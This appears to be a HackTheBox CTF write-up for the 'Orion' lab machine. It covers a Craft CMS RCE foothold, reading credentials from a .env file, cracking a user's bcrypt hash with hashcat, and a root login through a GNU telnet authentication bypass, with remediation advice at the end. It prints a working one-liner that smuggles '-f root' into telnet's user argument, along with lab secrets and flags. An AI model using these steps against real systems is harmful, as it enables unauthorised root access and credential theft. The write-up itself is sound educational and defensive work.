# Orion — HackTheBox Penetration Test Report

**Machine:** Orion · **Platform:** HackTheBox · **OS:** Ubuntu 22.04 LTS (Linux)
**Target:** 10.129.83.229 · **Domain:** orion.htb · **Author:** Rayan Fakhreddine
**Result:** Full compromise — root shell on the host.

---

## 1. Executive Summary

Orion is a Linux web server that was fully compromised from an unauthenticated network position. Two known, publicly documented vulnerabilities did the work — no custom exploitation was needed.

The public website ran a content-management system (Craft CMS) on a version affected by a **critical, unauthenticated remote-code-execution flaw**. Exploiting it gave a foothold as the web service account with no login required. Reading the application's configuration file exposed a stored password hash for a real user; that hash was cracked offline to a weak password, which unlocked an interactive session as that user. Finally, a legacy `telnet` client on the machine carried a **second known vulnerability** whose authentication check could be bypassed, and it was used to obtain a root shell.

**Business impact:** an attacker with only network reach to this server could go from *no access* to *complete administrative control* using two off-the-shelf public exploits and one weak password. The exposure here is severe precisely because none of it required skill or novel research — it required only that the software be left unpatched.

Remediation for all findings is in Section 5.

---

## 2. Findings Overview

| # | Finding | Severity | Affected Component | MITRE ATT&CK |
|---|---------|----------|--------------------|--------------|
| 1 | Unauthenticated RCE in Craft CMS (CVE-2025-32432) | **Critical** | `orion.htb` web app (Craft CMS) | [T1190](https://attack.mitre.org/techniques/T1190/) |
| 2 | Authentication bypass in GNU inetutils `telnet` (CVE-2026-24061) → root | **Critical** | `telnet` client (local) | [T1068](https://attack.mitre.org/techniques/T1068/) |
| 3 | Stored credential hash in `.env`, cracked to a weak password | **High** | `adam` account / Craft `.env` | [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1110.002](https://attack.mitre.org/techniques/T1110/002/) |
| 4 | Development mode and secrets exposed in production config | **Medium** | Craft CMS `.env` | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |

---

## 3. Attack Narrative

Described in the order carried out, including attempts that failed.

### 3.1 Reconnaissance

Identify exposed services and the nature of the host.

```bash
nmap -sT -sC -sV 10.129.83.229
```

Two ports open — SSH (22, OpenSSH 8.9p1 / Ubuntu) and HTTP (80, nginx 1.18.0). The web server redirected to `http://orion.htb/`, so the host expects a name.

```bash
echo "10.129.83.229  orion.htb" | sudo tee -a /etc/hosts
```

A quick `nmap` vulnerability-script pass returned nothing actionable, and a `nikto -h http://orion.htb/` scan reported `0 host(s) tested` — it failed to enumerate the vhost usefully. Neither automated pass found the way in; that came from fingerprinting the app manually.

### 3.2 Web Enumeration → Framework Fingerprint

Identify the web application and its version — a specific product/version is the fastest route to a known exploit.

Following the admin path redirected to `/admin/login`. Inspecting the page source (via `curl` and the rendered HTML) revealed the platform in the footer:

```html
<footer class="footer">
  <p>© 2026 Orion Telecom</p>
  <p>Powered by CraftCMS</p>
</footer>
```

The login page and asset paths confirmed **Craft CMS 5.6.16**.

![[Pasted image 20260919183627.png]]
### 3.3 Foothold — CVE-2025-32432 (Craft CMS unauthenticated RCE)

Craft CMS has a critical unauthenticated RCE; check applicability before any manual effort.

**CVE-2025-32432** affects Craft CMS 3.0.0-RC1 → 3.9.14, 4.0.0-RC1 → 4.14.14, and 5.0.0-RC1 → 5.6.16 (CWE-94, code injection). The flaw is in the public endpoint `actions/assets/generate-transform`, which mishandles untrusted input and allows **unauthenticated remote code execution** — no login required.

Exploiting the endpoint yielded command execution as the web service account **`www-data`**.

> *Note: I used hints from the walkthrough to understand how to gain the foothold.
### 3.4 Credential Recovery and Lateral Movement

With a foothold, read the app config — CMS `.env` files routinely hold database credentials and keys, and adjacent secrets often lead to a real user.

```bash
cat /var/www/html/craft/.env
```

The file exposed the Craft security key, database credentials, and dev settings:

```ini
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

From the database, the password **hash** for the user **`adam`** was recovered:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

Cracked offline with hashcat against `rockyou`:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# $2y$13$...LUg0lS : darkangel   -> Cracked
```

The password `darkangel` let me switch to the real user from the web shell:

```bash
su adam        # password: darkangel
adam@orion:~$ cat /home/adam/user.txt
cac0dae674140c04387ab2c49f9799d5
```

**User flag captured.**

![[Pasted image 20260919183927.png]]
### 3.5 Privilege Escalation — CVE-2026-24061 (telnet authentication bypass)

Look for a local vector `adam` can abuse. A legacy `telnet` client (GNU inetutils) was present, and that build carries a known authentication-bypass flaw.

**CVE-2026-24061** is an authentication bypass in GNU inetutils `telnet`: the value passed to the `--user` option is not sanitized before being handed to `login`. By smuggling the `-f` flag (which tells `login` to skip authentication) inside that option, an attacker logs in as any user — including **root** — without a password.

```bash
telnet -a 127.0.0.1 --user="-f root"
```

The connection to localhost dropped straight into a **root session**:

```
root@orion:~# id
uid=0(root) ...
root@orion:~# cat /root/root.txt
f62c9b847ca7ac0b7941cf92dd0fdf63
```

**Root flag captured — full host compromise.**

![[Pasted image 20260919184044.png]]
---

## 4. MITRE ATT&CK Mapping

| Phase | Technique | ID |
|-------|-----------|-----|
| Service discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046/) |
| App fingerprinting | Gather Victim Host Information: Software | [T1592.002](https://attack.mitre.org/techniques/T1592/002/) |
| Foothold (Craft CMS) | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Command execution | Command and Scripting Interpreter | [T1059](https://attack.mitre.org/techniques/T1059/) |
| Secrets in config | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Offline cracking | Brute Force: Password Cracking | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) |
| Lateral movement | Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) |
| Privilege escalation | Exploitation for Privilege Escalation | [T1068](https://attack.mitre.org/techniques/T1068/) |

---

## 5. Remediation

Ordered by priority; each gives the specific fix and the control class it belongs to.

### Priority 1 — Patch Craft CMS (Finding 1, Critical)
Upgrade Craft CMS to a version past the CVE-2025-32432 fix (≥ 3.9.15 / 4.14.15 / 5.6.17). Because the flaw is unauthenticated and remotely reachable, treat this as an emergency patch, and rotate the exposed `CRAFT_SECURITY_KEY` afterward since a foothold could have disclosed it.
*Control class — patch management for internet-facing software; rotate secrets after any compromise.*

### Priority 2 — Update or remove the vulnerable telnet client (Finding 2, Critical)
Patch GNU inetutils to a version that fixes CVE-2026-24061, or remove the `telnet` client entirely — it has no place on a modern server. Audit the host for other legacy network clients.
*Control class — minimize installed software; patch local tooling, not just services.*

### Priority 3 — Fix credential hygiene (Finding 3, High)
`darkangel` is a trivially crackable password; enforce a strong password policy and rotate the `adam` account. Do not store recoverable secrets where a web-service compromise can read them — move them to a secrets manager or environment isolated from the web root.
*Control class — strong credentials + secrets management; a `www-data` compromise should not yield a user login.*

### Priority 4 — Harden the production configuration (Finding 4, Medium)
`CRAFT_DEV_MODE=true` and `CRAFT_ENVIRONMENT=dev` on a live host expose verbose errors and stack traces that aid an attacker. Set production mode, disable dev mode, and ensure the database account the app uses is **not** `root`.
*Control class — secure defaults in production; least privilege for service DB accounts.*

### Cross-cutting
Web-application firewalling in front of Craft, and alerting on unexpected `telnet`/`login` invocations, would raise the chance of detecting both stages even if a patch lagged.
